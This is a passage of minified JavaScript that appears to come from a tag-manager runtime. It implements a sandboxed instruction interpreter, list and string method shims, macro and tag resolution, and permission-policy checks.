      for (var c = this.length(), d = 0; d < this.length() && d < c; d++) this.has(d) && b.invoke(a, this.get(d), d, this);
    },
    hasOwnProperty: function (a, b) {
      return this.has(b);
    },
    indexOf: function (a, b, c) {
      var d = this.length(),
        e = void 0 === c ? 0 : Number(c);
      0 > e && (e = Math.max(d + e, 0));
      for (var f = e; f < d; f++) if (this.has(f) && this.get(f) === b) return f;
      return -1;
    },
    join: function (a, b) {
      for (var c = [], d = 0; d < this.length(); d++) c.push(this.get(d));
      return c.join(b);
    },
    lastIndexOf: function (a, b, c) {
      var d = this.length(),
        e = d - 1;
      void 0 !== c && (e = 0 > c ? d + c : Math.min(c, e));
      for (var f = e; 0 <= f; f--) if (this.has(f) && this.get(f) === b) return f;
      return -1;
    },
    map: function (a, b) {
      for (var c = this.length(), d = [], e = 0; e < this.length() && e < c; e++) this.has(e) && (d[e] = b.invoke(a, this.get(e), e, this));
      return new rb(d);
    },
    pop: function () {
      return this.pop();
    },
    push: function (a, b) {
      return this.push.apply(this, Array.prototype.slice.call(arguments, 1));
    },
    reduce: function (a, b, c) {
      var d = this.length(),
        e,
        f = 0;
      if (void 0 !== c) e = c;else {
        if (0 === d) throw Error("TypeError: Reduce on List with no elements.");
        for (var g = 0; g < d; g++) if (this.has(g)) {
          e = this.get(g);
          f = g + 1;
          break;
        }
        if (g === d) throw Error("TypeError: Reduce on List with no elements.");
      }
      for (var k = f; k < d; k++) this.has(k) && (e = b.invoke(a, e, this.get(k), k, this));
      return e;
    },
    reduceRight: function (a, b, c) {
      var d = this.length(),
        e,
        f = d - 1;
      if (void 0 !== c) e = c;else {
        if (0 === d) throw Error("TypeError: ReduceRight on List with no elements.");
        for (var g = 1; g <= d; g++) if (this.has(d - g)) {
          e = this.get(d - g);
          f = d - (g + 1);
          break;
        }
        if (g > d) throw Error("TypeError: ReduceRight on List with no elements.");
      }
      for (var k = f; 0 <= k; k--) this.has(k) && (e = b.invoke(a, e, this.get(k), k, this));
      return e;
    },
    reverse: function () {
      for (var a = ob(this), b = a.length - 1, c = 0; 0 <= b; b--, c++) a.hasOwnProperty(b) ? this.set(c, a[b]) : this.remove(c);
      return this;
    },
    shift: function () {
      return this.shift();
    },
    slice: function (a, b, c) {
      var d = this.length();
      void 0 === b && (b = 0);
      b = 0 > b ? Math.max(d + b, 0) : Math.min(b, d);
      c = void 0 === c ? d : 0 > c ? Math.max(d + c, 0) : Math.min(c, d);
      c = Math.max(b, c);
      for (var e = [], f = b; f < c; f++) e.push(this.get(f));
      return new rb(e);
    },
    some: function (a, b) {
      for (var c = this.length(), d = 0; d < this.length() && d < c; d++) if (this.has(d) && b.invoke(a, this.get(d), d, this)) return !0;
      return !1;
    },
    sort: function (a, b) {
      var c = ob(this);
      void 0 === b ? c.sort() : c.sort(function (e, f) {
        return Number(b.invoke(a, e, f));
      });
      for (var d = 0; d < c.length; d++) c.hasOwnProperty(d) ? this.set(d, c[d]) : this.remove(d);
      return this;
    },
    splice: function (a, b, c, d) {
      return this.splice.apply(this, Array.prototype.splice.call(arguments, 1, arguments.length - 1));
    },
    toString: function () {
      return this.toString();
    },
    unshift: function (a, b) {
      return this.unshift.apply(this, Array.prototype.slice.call(arguments, 1));
    }
  };
  var qd = function (a) {
    var b;
    b = Error.call(this, a);
    this.message = b.message;
    "stack" in b && (this.stack = b.stack);
  };
  sa(qd, Error);
  var rd = {
      charAt: 1,
      concat: 1,
      indexOf: 1,
      lastIndexOf: 1,
      match: 1,
      replace: 1,
      search: 1,
      slice: 1,
      split: 1,
      substring: 1,
      toLowerCase: 1,
      toLocaleLowerCase: 1,
      toString: 1,
      toUpperCase: 1,
      toLocaleUpperCase: 1,
      trim: 1
    },
    sd = new xa("break"),
    td = new xa("continue"),
    ud = function (a, b) {
      return K(this, a) + K(this, b);
    },
    vd = function (a, b) {
      return K(this, a) && K(this, b);
    },
    wd = function (a, b, c) {
      a = K(this, a);
      b = K(this, b);
      c = K(this, c);
      if (!(c instanceof rb)) throw Error("Error: Non-List argument given to Apply instruction.");
      if (null === a || void 0 === a) {
        var d = "TypeError: Can't read property " + b + " of " + a + ".";
        if (od()) throw new qd(d);
        throw Error(d);
      }
      var e = "number" === typeof a;
      if ("boolean" === typeof a || e) {
        if ("toString" === b) {
          if (e && c.length()) {
            var f = nd(c.get(0));
            try {
              return a.toString(f);
            } catch (y) {}
          }
          return a.toString();
        }
        var g = "TypeError: " + a + "." + b + " is not a function.";
        if (od()) throw new qd(g);
        throw Error(g);
      }
      if ("string" === typeof a) {
        if (rd.hasOwnProperty(b)) {
          var k = 2;
          k = 1;
          var m = nd(c, void 0, k);
          return md(a[b].apply(a, m), this.h);
        }
        var n = "TypeError: " + b + " is not a function";
        if (od()) throw new qd(n);
        throw Error(n);
      }
      if (a instanceof rb) {
        if (a.has(b)) {
          var p = a.get(b);
          if (p instanceof ed) {
            var q = ob(c);
            q.unshift(this.h);
            return p.invoke.apply(p, q);
          }
          var r = "TypeError: " + b + " is not a function";
          if (od()) throw new qd(r);
          throw Error(r);
        }
        if (0 <= pd.supportedMethods.indexOf(b)) {
          var t = ob(c);
          t.unshift(this.h);
          return pd[b].apply(a, t);
        }
      }
      if (a instanceof ed || a instanceof sb) {
        if (a.has(b)) {
          var u = a.get(b);
          if (u instanceof ed) {
            var v = ob(c);
            v.unshift(this.h);
            return u.invoke.apply(u, v);
          }
          var w = "TypeError: " + b + " is not a function";
          if (od()) throw new qd(w);
          throw Error(w);
        }
        if ("toString" === b) return a instanceof ed ? a.N : a.toString();
        if ("hasOwnProperty" === b) return a.has.apply(a, ob(c));
      }
      if (a instanceof jd && "toString" === b) return a.toString();
      var x = "TypeError: Object has no '" + b + "' property.";
      if (od()) throw new qd(x);
      throw Error(x);
    },
    xd = function (a, b) {
      a = K(this, a);
      if ("string" !== typeof a) throw Error("Invalid key name given for assignment.");
      var c = this.h;
      if (!c.has(a)) throw Error("Attempting to assign to undefined value " + b);
      var d = K(this, b);
      c.set(a, d);
      return d;
    },
    yd = function (a) {
      var b = Ca(this.h),
        c = eb(b, Array.prototype.slice.apply(arguments));
      if (c instanceof xa) return c;
    },
    zd = function () {
      return sd;
    },
    Ad = function (a) {
      for (var b = K(this, a), c = 0; c < b.length; c++) {
        var d = K(this, b[c]);
        if (d instanceof xa) return d;
      }
    },
    Bd = function (a) {
      for (var b = this.h, c = 0; c < arguments.length - 1; c += 2) {
        var d = arguments[c];
        if ("string" === typeof d) {
          var e = K(this, arguments[c + 1]);
          Ba(b, d, e, !0);
        }
      }
    },
    Cd = function () {
      return td;
    },
    Dd = function (a, b) {
      return new xa(a, K(this, b));
    },
    Ed = function (a, b, c) {
      var d = new rb();
      b = K(this, b);
      for (var e = 0; e < b.length; e++) d.push(b[e]);
      var f = [51, a, d].concat(Array.prototype.splice.call(arguments, 2, arguments.length - 2));
      this.h.add(a, K(this, f));
    },
    Fd = function (a, b) {
      return K(this, a) / K(this, b);
    },
    Gd = function (a, b) {
      a = K(this, a);
      b = K(this, b);
      var c = a instanceof jd,
        d = b instanceof jd;
      return c || d ? c && d ? a.h == b.h : !1 : a == b;
    },
    Hd = function (a) {
      for (var b, c = 0; c < arguments.length; c++) b = K(this, arguments[c]);
      return b;
    };
  function Id(a, b, c, d) {
    for (var e = 0; e < b(); e++) {
      var f = a(c(e)),
        g = eb(f, d);
      if (g instanceof xa) {
        if ("break" === g.h) break;
        if ("return" === g.h) return g;
      }
    }
  }
  function Jd(a, b, c) {
    if ("string" === typeof b) return Id(a, function () {
      return b.length;
    }, function (f) {
      return f;
    }, c);
    if (b instanceof sb || b instanceof rb || b instanceof ed) {
      var d = b.Ub(),
        e = d.length();
      return Id(a, function () {
        return e;
      }, function (f) {
        return d.get(f);
      }, c);
    }
  }
  var Kd = function (a, b, c) {
      a = K(this, a);
      b = K(this, b);
      c = K(this, c);
      var d = this.h;
      return Jd(function (e) {
        d.set(a, e);
        return d;
      }, b, c);
    },
    Ld = function (a, b, c) {
      a = K(this, a);
      b = K(this, b);
      c = K(this, c);
      var d = this.h;
      return Jd(function (e) {
        var f = Ca(d);
        Ba(f, a, e, !0);
        return f;
      }, b, c);
    },
    Md = function (a, b, c) {
      a = K(this, a);
      b = K(this, b);
      c = K(this, c);
      var d = this.h;
      return Jd(function (e) {
        var f = Ca(d);
        f.add(a, e);
        return f;
      }, b, c);
    },
    Od = function (a, b, c) {
      a = K(this, a);
      b = K(this, b);
      c = K(this, c);
      var d = this.h;
      return Nd(function (e) {
        d.set(a, e);
        return d;
      }, b, c);
    },
    Pd = function (a, b, c) {
      a = K(this, a);
      b = K(this, b);
      c = K(this, c);
      var d = this.h;
      return Nd(function (e) {
        var f = Ca(d);
        Ba(f, a, e, !0);
        return f;
      }, b, c);
    },
    Qd = function (a, b, c) {
      a = K(this, a);
      b = K(this, b);
      c = K(this, c);
      var d = this.h;
      return Nd(function (e) {
        var f = Ca(d);
        f.add(a, e);
        return f;
      }, b, c);
    };
  function Nd(a, b, c) {
    if ("string" === typeof b) return Id(a, function () {
      return b.length;
    }, function (d) {
      return b[d];
    }, c);
    if (b instanceof rb) return Id(a, function () {
      return b.length();
    }, function (d) {
      return b.get(d);
    }, c);
    if (od()) throw new qd("The value is not iterable.");
    throw new TypeError("The value is not iterable.");
  }
  var Rd = function (a, b, c, d) {
      function e(p, q) {
        for (var r = 0; r < f.length(); r++) {
          var t = f.get(r);
          q.add(t, p.get(t));
        }
      }
      var f = K(this, a);
      if (!(f instanceof rb)) throw Error("TypeError: Non-List argument given to ForLet instruction.");
      var g = this.h;
      d = K(this, d);
      var k = Ca(g);
      for (e(g, k); fb(k, b);) {
        var m = eb(k, d);
        if (m instanceof xa) {
          if ("break" === m.h) break;
          if ("return" === m.h) return m;
        }
        var n = Ca(g);
        e(k, n);
        fb(n, c);
        k = n;
      }
    },
    Sd = function (a, b, c) {
      var d = this.h,
        e = K(this, b);
      if (!(e instanceof rb)) throw Error("Error: non-List value given for Fn argument names.");
      var f = Array.prototype.slice.call(arguments, 2);
      return new ed(a, function () {
        return function (g) {
          var k = Ca(d);
          void 0 === k.h && (k.h = this.h.h);
          for (var m = Array.prototype.slice.call(arguments, 0), n = 0; n < m.length; n++) if (m[n] = K(this, m[n]), m[n] instanceof xa) return m[n];
          for (var p = e.get("length"), q = 0; q < p; q++) q < m.length ? k.add(e.get(q), m[q]) : k.add(e.get(q), void 0);
          k.add("arguments", new rb(m));
          var r = eb(k, f);
          if (r instanceof xa) return "return" === r.h ? r.C : r;
        };
      }());
    },
    Td = function (a) {
      a = K(this, a);
      var b = this.h,
        c = !1;
      if (c && !b.has(a)) throw new ReferenceError(a + " is not defined.");
      return b.get(a);
    },
    Ud = function (a, b) {
      var c;
      a = K(this, a);
      b = K(this, b);
      if (void 0 === a || null === a) {
        var d = "TypeError: Cannot read properties of " + a + " (reading '" + b + "')";
        if (od()) throw new qd(d);
        throw Error(d);
      }
      if (a instanceof sb || a instanceof rb || a instanceof ed) c = a.get(b);else if ("string" === typeof a) "length" === b ? c = a.length : qb(b) && (c = a[b]);else if (a instanceof jd) return;
      return c;
    },
    Vd = function (a, b) {
      return K(this, a) > K(this, b);
    },
    Wd = function (a, b) {
      return K(this, a) >= K(this, b);
    },
    Yd = function (a, b) {
      a = K(this, a);
      b = K(this, b);
      a instanceof jd && (a = a.h);
      b instanceof jd && (b = b.h);
      return a === b;
    },
    Zd = function (a, b) {
      return !Yd.call(this, a, b);
    },
    $d = function (a, b, c) {
      var d = [];
      K(this, a) ? d = K(this, b) : c && (d = K(this, c));
      var e = eb(this.h, d);
      if (e instanceof xa) return e;
    },
    ae = function (a, b) {
      return K(this, a) < K(this, b);
    },
    be = function (a, b) {
      return K(this, a) <= K(this, b);
    },
    ce = function (a) {
      for (var b = new rb(), c = 0; c < arguments.length; c++) {
        var d = K(this, arguments[c]);
        b.push(d);
      }
      return b;
    },
    de = function (a) {
      for (var b = new sb(), c = 0; c < arguments.length - 1; c += 2) {
        var d = K(this, arguments[c]) + "",
          e = K(this, arguments[c + 1]);
        b.set(d, e);
      }
      return b;
    },
    ee = function (a, b) {
      return K(this, a) % K(this, b);
    },
    fe = function (a, b) {
      return K(this, a) * K(this, b);
    },
    ge = function (a) {
      return -K(this, a);
    },
    he = function (a) {
      return !K(this, a);
    },
    ie = function (a, b) {
      return !Gd.call(this, a, b);
    },
    je = function () {
      return null;
    },
    ke = function (a, b) {
      return K(this, a) || K(this, b);
    },
    le = function (a, b) {
      var c = K(this, a);
      K(this, b);
      return c;
    },
    me = function (a) {
      return K(this, a);
    },
    ne = function (a) {
      return Array.prototype.slice.apply(arguments);
    },
    oe = function (a) {
      return new xa("return", K(this, a));
    },
    pe = function (a, b, c) {
      a = K(this, a);
      b = K(this, b);
      c = K(this, c);
      if (null === a || void 0 === a) {
        var d = "TypeError: Can't set property " + b + " of " + a + ".";
        if (od()) throw new qd(d);
        throw Error(d);
      }
      (a instanceof ed || a instanceof rb || a instanceof sb) && a.set(b, c);
      return c;
    },
    qe = function (a, b) {
      return K(this, a) - K(this, b);
    },
    re = function (a, b, c) {
      a = K(this, a);
      var d = K(this, b),
        e = K(this, c);
      if (!Ha(d) || !Ha(e)) throw Error("Error: Malformed switch instruction.");
      for (var f, g = !1, k = 0; k < d.length; k++) if (g || a === K(this, d[k])) if (f = K(this, e[k]), f instanceof xa) {
        var m = f.h;
        if ("break" === m) return;
        if ("return" === m || "continue" === m) return f;
      } else g = !0;
      if (e.length === d.length + 1 && (f = K(this, e[e.length - 1]), f instanceof xa && ("return" === f.h || "continue" === f.h))) return f;
    },
    se = function (a, b, c) {
      return K(this, a) ? K(this, b) : K(this, c);
    },
    te = function (a) {
      a = K(this, a);
      return a instanceof ed ? "function" : typeof a;
    },
    ue = function (a) {
      for (var b = this.h, c = 0; c < arguments.length; c++) {
        var d = arguments[c];
        "string" !== typeof d || b.add(d, void 0);
      }
    },
    ve = function (a, b, c, d) {
      var e = K(this, d);
      if (K(this, c)) {
        var f = eb(this.h, e);
        if (f instanceof xa) {
          if ("break" === f.h) return;
          if ("return" === f.h) return f;
        }
      }
      for (; K(this, a);) {
        var g = eb(this.h, e);
        if (g instanceof xa) {
          if ("break" === g.h) break;
          if ("return" === g.h) return g;
        }
        K(this, b);
      }
    },
    we = function (a) {
      return ~Number(K(this, a));
    },
    xe = function (a, b) {
      return Number(K(this, a)) << Number(K(this, b));
    },
    ye = function (a, b) {
      return Number(K(this, a)) >> Number(K(this, b));
    },
    ze = function (a, b) {
      return Number(K(this, a)) >>> Number(K(this, b));
    },
    Ae = function (a, b) {
      return Number(K(this, a)) & Number(K(this, b));
    },
    Be = function (a, b) {
      return Number(K(this, a)) ^ Number(K(this, b));
    },
    Ce = function (a, b) {
      return Number(K(this, a)) | Number(K(this, b));
    },
    De = function () {},
    Ee = function (a, b, c, d, e) {
      var f = !0;
      try {
        var g = K(this, c);
        if (g instanceof xa) return g;
      } catch (r) {
        if (!(r instanceof qd && a)) throw f = r instanceof qd, r;
        var k = Ca(this.h),
          m = new jd(r);
        k.add(b, m);
        var n = K(this, d),
          p = eb(k, n);
        if (p instanceof xa) return p;
      } finally {
        if (f && void 0 !== e) {
          var q = K(this, e);
          if (q instanceof xa) return q;
        }
      }
    };
  var Ge = function () {
    this.h = new gb();
    Fe(this);
  };
  Ge.prototype.execute = function (a) {
    return this.h.C(a);
  };
  var Fe = function (a) {
    var b = function (c, d) {
      var e = new ed(String(c), d);
      e.Cb();
      a.h.h.set(String(c), e);
    };
    b("map", de);
    b("and", Zc);
    b("contains", bd);
    b("equals", $c);
    b("or", ad);
    b("startsWith", cd);
    b("variable", dd);
  };
  var Ie = function () {
    this.h = new gb();
    He(this);
  };
  Ie.prototype.execute = function (a) {
    return Je(this.h.C(a));
  };
  var Ke = function (a, b, c) {
      return Je(a.h.H(b, c));
    },
    He = function (a) {
      var b = function (c, d) {
        var e = String(c),
          f = new ed(e, d);
        f.Cb();
        a.h.h.set(e, f);
      };
      b(0, ud);
      b(1, vd);
      b(2, wd);
      b(3, xd);
      b(56, Ae);
      b(57, xe);
      b(58, we);
      b(59, Ce);
      b(60, ye);
      b(61, ze);
      b(62, Be);
      b(53, yd);
      b(4, zd);
      b(5, Ad);
      b(52, Bd);
      b(6, Cd);
      b(49, Dd);
      b(7, ce);
      b(8, de);
      b(9, Ad);
      b(50, Ed);
      b(10, Fd);
      b(12, Gd);
      b(13, Hd);
      b(51, Sd);
      b(47, Kd);
      b(54, Ld);
      b(55, Md);
      b(63, Rd);
      b(64, Od);
      b(65, Pd);
      b(66, Qd);
      b(15, Td);
      b(16, Ud);
      b(17, Ud);
      b(18, Vd);
      b(19, Wd);
      b(20, Yd);
      b(21, Zd);
      b(22, $d);
      b(23, ae);
      b(24, be);
      b(25, ee);
      b(26, fe);
      b(27, ge);
      b(28, he);
      b(29, ie);
      b(45, je);
      b(30, ke);
      b(32, le);
      b(33, le);
      b(34, me);
      b(35, me);
      b(46, ne);
      b(36, oe);
      b(43, pe);
      b(37, qe);
      b(38, re);
      b(39, se);
      b(67, Ee);
      b(40, te);
      b(44, De);
      b(41, ue);
      b(42, ve);
    };
  function Je(a) {
    if (a instanceof xa || a instanceof ed || a instanceof rb || a instanceof sb || a instanceof jd || null === a || void 0 === a || "string" === typeof a || "number" === typeof a || "boolean" === typeof a) return a;
  }
  ;
  function Le(a) {
    switch (a) {
      case 1:
        return "1";
      case 2:
      case 4:
        return "0";
      default:
        return "-";
    }
  }
  function Me(a) {
    switch (a) {
      case 1:
        return "G";
      case 3:
        return "g";
      case 2:
        return "D";
      case 4:
        return "d";
      case 0:
        return "g";
      default:
        return "g";
    }
  }
  function Ne(a, b) {
    var c = a[1] || 0,
      d = a[2] || 0;
    switch (b) {
      case 0:
        return "G1" + Le(c) + Le(d);
      case 1:
        return "G2" + Me(c) + Me(d);
      default:
        return "g1--";
    }
  }
  ;
  var Oe = function () {
    var a = function (b) {
      return {
        toString: function () {
          return b;
        }
      };
    };
    return {
      dk: a("consent"),
      Xh: a("convert_case_to"),
      Yh: a("convert_false_to"),
      Zh: a("convert_null_to"),
      ai: a("convert_true_to"),
      bi: a("convert_undefined_to"),
      nn: a("debug_mode_metadata"),
      za: a("function"),
      Wg: a("instance_name"),
      Lk: a("live_only"),
      Mk: a("malware_disabled"),
      Nk: a("metadata"),
      Qk: a("original_activity_id"),
      Bn: a("original_vendor_template_id"),
      An: a("once_on_load"),
      Pk: a("once_per_event"),
      Xi: a("once_per_load"),
      Gn: a("priority_override"),
      Hn: a("respected_consent_types"),
      cj: a("setup_tags"),
      qe: a("tag_id"),
      ij: a("teardown_tags")
    };
  }();
  var kf;
  var lf = [],
    mf = [],
    nf = [],
    of = [],
    pf = [],
    qf = {},
    rf,
    sf,
    tf = function (a) {
      sf = sf || a;
    },
    uf = function (a) {},
    vf,
    wf = [],
    xf = function (a, b) {
      var c = {};
      c[Oe.za] = "__" + a;
      for (var d in b) b.hasOwnProperty(d) && (c["vtp_" + d] = b[d]);
      return c;
    },
    yf = function (a, b) {
      var c = a[Oe.za],
        d = b && b.event;
      if (!c) throw Error("Error: No function name given for function call.");
      var e = qf[c],
        f = b && 2 === b.type && d.reportMacroDiscrepancy && e && -1 !== wf.indexOf(c),
        g = {},
        k = {},
        m;
      for (m in a) a.hasOwnProperty(m) && 0 === m.indexOf("vtp_") && (e && d && d.checkPixieIncompatibility && d.checkPixieIncompatibility(a[m]), e && (g[m] = a[m]), !e || f) && (k[m.substr(4)] = a[m]);
      e && d && d.cachedModelValues && (g.vtp_gtmCachedValues = d.cachedModelValues);
      if (b) {
        if (null == b.name) {
          var n;
          a: {
            var p = b.index;
            if (null == p) n = "";else {
              var q;
              switch (b.type) {
                case 2:
                  q = lf[p];
                  break;
                case 1:
                  q = of[p];
                  break;
                default:
                  n = "";
                  break a;
              }
              var r = q && q[Oe.Wg];
              n = r ? String(r) : "";
            }
          }
          b.name = n;
        }
        e && (g.vtp_gtmEntityIndex = b.index, g.vtp_gtmEntityName = b.name);
      }
      var t, u;
      e && (t = e(g));
      if (!e || f) u = kf(c, k, b);
      f && d && (pb(t) ? typeof t !== typeof u && d.reportMacroDiscrepancy(d.id, c) : t !== u && d.reportMacroDiscrepancy(d.id, c));
      return e ? t : u;
    },
    Af = function (a, b, c) {
      c = c || [];
      var d = {},
        e;
      for (e in a) a.hasOwnProperty(e) && (d[e] = zf(a[e], b, c));
      return d;
    },
    zf = function (a, b, c) {
      if (Ha(a)) {
        var d;
        switch (a[0]) {
          case "function_id":
            return a[1];
          case "list":
            d = [];
            for (var e = 1; e < a.length; e++) d.push(zf(a[e], b, c));
            return d;
          case "macro":
            var f = a[1];
            if (c[f]) return;
            var g = lf[f];
            if (!g || b.isBlocked(g)) return;
            c[f] = !0;
            var k = String(g[Oe.Wg]);
            try {
              var m = Af(g, b, c);
              m.vtp_gtmEventId = b.id;
              b.priorityId && (m.vtp_gtmPriorityId = b.priorityId);
              d = yf(m, {
                event: b,
                index: f,
                type: 2,
                name: k
              });
              vf && (d = vf.ol(d, m));
            } catch (y) {
              b.logMacroError && b.logMacroError(y, Number(f), k), d = !1;
            }
            c[f] = !1;
            return d;
          case "map":
            d = {};
            for (var n = 1; n < a.length; n += 2) d[zf(a[n], b, c)] = zf(a[n + 1], b, c);
            return d;
          case "template":
            d = [];
            for (var p = !1, q = 1; q < a.length; q++) {
              var r = zf(a[q], b, c);
              sf && (p = p || sf.bm(r));
              d.push(r);
            }
            return sf && p ? sf.rl(d) : d.join("");
          case "escape":
            d = zf(a[1], b, c);
            if (sf && Ha(a[1]) && "macro" === a[1][0] && sf.dm(a)) return sf.Im(d);
            d = String(d);
            for (var t = 2; t < a.length; t++) Pe[a[t]] && (d = Pe[a[t]](d));
            return d;
          case "tag":
            var u = a[1];
            if (!of[u]) throw Error("Unable to resolve tag reference " + u + ".");
            return d = {
              tj: a[2],
              index: u
            };
          case "zb":
            var v = {
              arg0: a[2],
              arg1: a[3],
              ignore_case: a[5]
            };
            v[Oe.za] = a[1];
            var w = Bf(v, b, c),
              x = !!a[4];
            return x || 2 !== w ? x !== (1 === w) : null;
          default:
            throw Error("Attempting to expand unknown Value type: " + a[0] + ".");
        }
      }
      return a;
    },
    Bf = function (a, b, c) {
      try {
        return rf(Af(a, b, c));
      } catch (d) {
        JSON.stringify(a);
      }
      return 2;
    },
    Cf = function (a) {
      var b = a[Oe.za];
      if (!b) throw Error("Error: No function name given for function call.");
      return !!qf[b];
    };
  var Df = function (a, b, c) {
    var d;
    d = Error.call(this, c);
    this.message = d.message;
    "stack" in d && (this.stack = d.stack);
    this.h = a;
  };
  sa(Df, Error);
  function Ef(a, b) {
    if (Ha(a)) {
      Object.defineProperty(a, "context", {
        value: {
          line: b[0]
        }
      });
      for (var c = 1; c < a.length; c++) Ef(a[c], b[c]);
    }
  }
  ;
  var Ff = function (a, b) {
    var c;
    c = Error.call(this);
    this.message = c.message;
    "stack" in c && (this.stack = c.stack);
    this.Cm = a;
    this.C = b;
    this.h = [];
  };
  sa(Ff, Error);
  var Hf = function () {
    return function (a, b) {
      a instanceof Ff || (a = new Ff(a, Gf));
      b && a.h.push(b);
      throw a;
    };
  };
  function Gf(a) {
    if (!a.length) return a;
    a.push({
      id: "main",
      line: 0
    });
    for (var b = a.length - 1; 0 < b; b--) Ga(a[b].id) && a.splice(b++, 1);
    for (var c = a.length - 1; 0 < c; c--) a[c].line = a[c - 1].line;
    a.splice(0, 1);
    return a;
  }
  ;
  var Kf = function (a) {
      function b(r) {
        for (var t = 0; t < r.length; t++) d[r[t]] = !0;
      }
      for (var c = [], d = [], e = If(a), f = 0; f < mf.length; f++) {
        var g = mf[f],
          k = Jf(g, e);
        if (k) {
          for (var m = g.add || [], n = 0; n < m.length; n++) c[m[n]] = !0;
          b(g.block || []);
        } else null === k && b(g.block || []);
      }
      for (var p = [], q = 0; q < of.length; q++) c[q] && !d[q] && (p[q] = !0);
      return p;
    },
    Jf = function (a, b) {
      for (var c = a["if"] || [], d = 0; d < c.length; d++) {
        var e = b(c[d]);
        if (0 === e) return !1;
        if (2 === e) return null;
      }
      for (var f = a.unless || [], g = 0; g < f.length; g++) {
        var k = b(f[g]);
        if (2 === k) return null;
        if (1 === k) return !1;
      }
      return !0;
    },
    If = function (a) {
      var b = [];
      return function (c) {
        void 0 === b[c] && (b[c] = Bf(nf[c], a));
        return b[c];
      };
    };
  var Lf = {
    ol: function (a, b) {
      b[Oe.Xh] && "string" === typeof a && (a = 1 == b[Oe.Xh] ? a.toLowerCase() : a.toUpperCase());
      b.hasOwnProperty(Oe.Zh) && null === a && (a = b[Oe.Zh]);
      b.hasOwnProperty(Oe.bi) && void 0 === a && (a = b[Oe.bi]);
      b.hasOwnProperty(Oe.ai) && !0 === a && (a = b[Oe.ai]);
      b.hasOwnProperty(Oe.Yh) && !1 === a && (a = b[Oe.Yh]);
      return a;
    }
  };
  var Mf = function () {
      this.h = {};
    },
    Of = function (a, b) {
      var c = Nf.C,
        d;
      null != (d = c.h)[a] || (d[a] = []);
      c.h[a].push(function () {
        return b.apply(null, ka(ta.apply(0, arguments)));
      });
    };
  function Pf(a, b, c, d) {
    if (a) for (var e = 0; e < a.length; e++) {
      var f = void 0,
        g = "A policy function denied the permission request";
      try {
        f = a[e](b, c, d), g += ".";
      } catch (k) {
        g = "string" === typeof k ? g + (": " + k) : k instanceof Error ? g + (": " + k.message) : g + ".";
      }
      if (!f) throw new Df(c, d, g);
    }
  }
  function Qf(a, b, c) {
    return function () {
      var d = arguments[0];
      if (d) {
        var e = a.h[d],
          f = a.h.all;
        if (e || f) {
          var g = c.apply(void 0, Array.prototype.slice.call(arguments, 0));
          Pf(e, b, d, g);
          Pf(f, b, d, g);
        }
      }
    };
  }
  ;
  var Rf = [],
    Sf = function (a) {
      return void 0 == Rf[a] ? !1 : Rf[a];
    };
  var Wf = function () {
      var a = data.permissions || {},
        b = Tf.ctid,
        c = this;
      this.C = new Mf();
      this.h = {};
      var d = Sf(15),
        e = {},
        f = {},
        g = Qf(this.C, b, function () {
          var k = arguments[0];
          return k && e[k] ? e[k].apply(void 0, Array.prototype.slice.call(arguments, 0)) : {};
        });
      l(a, function (k, m) {
        var n = {};
        l(m, function (q, r) {
          var t = Uf(q, r);
          n[q] = t.assert;
          e[q] || (e[q] = t.M);
          d && t.lj && !f[q] && (f[q] = t.lj);
        });
        var p;
        d && (p = function (q) {
          var r = ta.apply(1, arguments);
          if (!n[q]) throw Vf(q, {}, "The requested additional permission " + q + " is not configured.");
          g.apply(null, [q].concat(ka(r)));
        });
        c.h[k] = function (q, r) {
          var t = n[q];
          if (!t) throw Vf(q, {}, "The requested permission " + q + " is not configured.");
          var u = Array.prototype.slice.call(arguments, 0);
          t.apply(void 0, u);
          g.apply(void 0, u);
          if (d) {
            var v = f[q];
            v && v.apply(null, [p].concat(ka(u.slice(1))));
          }
        };
      });
    },
    Xf = function (a) {
      return Nf.h[a] || function () {};
    };
  function Uf(a, b) {
    var c = xf(a, b);
    c.vtp_permissionName = a;
    c.vtp_createPermissionError = Vf;
    try {
      return yf(c);
    } catch (d) {
      return {
        assert: function (e) {
          throw new Df(e, {}, "Permission " + e + " is unknown.");
        },
        M: function () {
          if (Sf(15)) throw new Df(a, {}, "Permission " + a + " is unknown.");
          for (var e = {}, f = 0; f < arguments.length; ++f) e["arg" + (f + 1)] = arguments[f];
          return e;
        }
      };
    }
  }
  function Vf(a, b, c) {
    return new Df(a, b, c);
  }
  ;
  var Yf = !1;
  var Zf = {};
  Zf.jn = Pa('');
  Zf.vl = Pa('');
  var $f = Yf,
    ag = Zf.vl,
    bg = Zf.jn;
  var pg = ["matches", "webkitMatchesSelector", "mozMatchesSelector", "msMatchesSelector", "oMatchesSelector"];
  function qg(a, b) {
    a = String(a);
    b = String(b);
    var c = a.length - b.length;
    return 0 <= c && a.indexOf(b, c) === c;
  }
  var rg = new La();
  function sg(a, b, c) {
    var d = c ? "i" : void 0;
    try {
      var e = String(b) + d,
        f = rg.get(e);
      f || (f = new RegExp(b, d), rg.set(e, f));
      return f.test(a);
    } catch (g) {
      return !1;
    }
  }
  function tg(a, b) {
    return 0 <= String(a).indexOf(String(b));
  }
  function ug(a, b) {
    return String(a) === String(b);
  }
  function vg(a, b) {
    return Number(a) >= Number(b);
  }
  function wg(a, b) {
    return Number(a) <= Number(b);
  }
  function xg(a, b) {
    return Number(a) > Number(b);
  }
  function yg(a, b) {
    return Number(a) < Number(b);
  }
  function zg(a, b) {
    return 0 === String(a).indexOf(String(b));
  }
  ;
  var Gg = /^[1-9a-zA-Z_-][1-9a-c][1-9a-v]\d$/;
  function Hg(a, b) {
    for (var c = "", d = !0; 7 < a;) {
      var e = a & 31;
      a >>= 5;
      d ? d = !1 : e |= 32;
      c = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_"[e] + c;
    }
    a <<= 2;
    d || (a |= 32);
    return c = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_"[a | b] + c;
  }
  ;
  var Ig = /^([a-z][a-z0-9]*):(!|\?)(\*|string|boolean|number|Fn|PixieMap|List|OpaqueValue)$/i,
    Jg = {
      Fn: "function",
      PixieMap: "Object",
      List: "Array"
    },
    M = function (a, b, c) {
      for (var d = 0; d < b.length; d++) {
        var e = Ig.exec(b[d]);
        if (!e) throw Error("Internal Error in " + a);
        var f = e[1],
          g = "!" === e[2],
          k = e[3],
          m = c[d];
        if (null == m) {
          if (g) throw Error("Error in " + a + ". Required argument " + f + " not supplied.");
        } else if ("*" !== k) {
          var n = typeof m;
